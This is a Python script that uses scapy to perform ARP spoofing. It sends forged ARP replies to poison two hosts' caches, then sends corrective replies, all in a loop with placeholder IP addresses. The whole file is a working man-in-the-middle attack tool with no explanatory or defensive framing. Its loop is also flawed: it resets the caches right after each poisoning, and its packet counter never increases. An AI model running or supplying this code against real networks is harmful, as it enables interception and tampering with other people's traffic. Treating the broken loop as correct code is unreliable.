import scapy.all as scapy
import time

def get_mac_address(ip):
    arp_request_packet = scapy.ARP(pdst=ip)
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    combined_packet = broadcast_packet/arp_request_packet
    answered_list = scapy.srp(combined_packet,timeout=1,verbose=False)[0]


    return answered_list[0][1].hwsrc


def arp_poisoning(target_ip,poisoned_ip):

    target_mac = get_mac_address(target_ip)
    arp_response = scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=poisoned_ip)
    scapy.send(arp_response,verbose=False)

def reset_operation(fooled_ip,gateway_ip):

    fooled_mac = get_mac_address(fooled_ip)
    gateway_mac = get_mac_address(gateway_ip)

    arp_response = scapy.ARP(op=2,pdst=fooled_ip,hwdst=fooled_mac,psrc=gateway_ip,hwsrc=gateway_mac)
    scapy.send(arp_response,verbose=False,count=6)

number = 0
try:
    while True:

        arp_poisoning("ip_address","ip_address")
        arp_poisoning("ip_address","ip_address")
        time.sleep(3)
        print("\rSending packets " + str(number),end="")
        reset_operation("ip_address","ip_address")
        reset_operation("ip_address","ip_address")

except KeyboardInterrupt:
    print("\nQuit & Reset")
